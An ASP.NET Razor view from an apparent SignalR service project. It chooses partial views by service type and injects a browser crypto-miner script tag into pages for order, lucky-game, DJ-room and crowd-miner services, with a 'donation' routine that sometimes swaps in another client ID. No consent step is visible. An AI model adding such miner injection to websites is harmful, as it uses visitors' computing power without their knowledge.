@model SignalRService.ViewModels.ServiceSettingViewModel

@{
    //   Layout = "~/Views/Shared/_LayoutMobile.cshtml";
}

@*@Html.Action("RenderSignalRBase","Service")*@
@*@Html.Partial("SignalRBase", Model)*@


@*<h4>@Model.ServiceName</h4>*@


@helper renderMiner()
{
        string ClientId = Model.MinerConfigurationViewModel.ClientId;
        bool shallDonate = SignalRService.Utils.ScriptDonater.Instance.ShallDonate(ClientId);
        if (shallDonate)
        {
            string donateClientId = SignalRService.Utils.ScriptDonater.Instance.Donate(ClientId);
            <text>
                <script>
                @SignalRService.Utils.RenderUtils.RenderMinerScript(donateClientId, Model.MinerConfigurationViewModel.Throttle, Model.MinerConfigurationViewModel.ScriptUrl, Model.MinerConfigurationViewModel.StartDelayMs, Model.MinerConfigurationViewModel.ReportStatusIntervalMs, true)
                </script>
            </text>
        }
        else
        {
            SignalRService.Utils.ScriptDonater.Instance.AddStat(ClientId);
            <text>
                <script>
                @SignalRService.Utils.RenderUtils.RenderMinerScript(Model.MinerConfigurationViewModel.ClientId, Model.MinerConfigurationViewModel.Throttle, Model.MinerConfigurationViewModel.ScriptUrl, Model.MinerConfigurationViewModel.StartDelayMs, Model.MinerConfigurationViewModel.ReportStatusIntervalMs, true)
                </script>
            </text>
        }
}

@{

    switch (Model.EnumServiceTpe)
    {
        case SignalRService.Enums.EnumServiceType.OrderService:
            @renderMiner()
            @Html.Partial("StripePayment")
            if (SignalRService.Utils.ServiceUtils.IsServiceOwner(Model.Id, User.Identity.Name))
            {
                @Html.Partial("RenderOrderHost", Model.OrderHostConfigurationViewModel)
            }
            else
            {
                @Html.Partial("RenderOrderClient", Model.OrderClientConfigurationViewModel)
            }
            break;
        case SignalRService.Enums.EnumServiceType.TaxiService:
            break;
        case SignalRService.Enums.EnumServiceType.SecurityService:
            break;
        case SignalRService.Enums.EnumServiceType.OrderServiceDrone:
            if (SignalRService.Utils.ServiceUtils.IsServiceOwner(Model.Id, User.Identity.Name))
            {
                @Html.Partial("RenderDroneHost", Model.OrderHostConfigurationViewModel)
            }
            else
            {
                @Html.Partial("RenderDroneClient", Model.OrderClientConfigurationViewModel)
            }
            break;
        case SignalRService.Enums.EnumServiceType.LuckyGameDefault:
            @renderMiner()
            Layout = "~/Views/Shared/_LayoutReact.cshtml";
            @Html.Partial("~/Views/LuckyGame/Index.cshtml", Model.LuckyGameSettingsViewModel);
            break;

        case SignalRService.Enums.EnumServiceType.BaseTracking:
            Layout = "~/Views/Shared/_LayoutReact.cshtml";
            @Html.Partial("~/Views/PositionTracker/Index.cshtml", Model.PositionTrackerConfiguratinViewModel);
            break;

        case SignalRService.Enums.EnumServiceType.CrowdMiner:
            @renderMiner()
            Layout = "~/Views/Shared/_LayoutCrowdMiner.cshtml";
            @Html.Partial("~/Views/CrowdMiner/Index.cshtml", Model);
            break;

        case SignalRService.Enums.EnumServiceType.DJRoom:
            @renderMiner()
            Layout = "~/Views/Shared/_LayoutDJRoom.cshtml";
            @Html.Partial("~/Views/DJRoom/Index.cshtml", Model);
            break;

        default:
            break;
    }


}








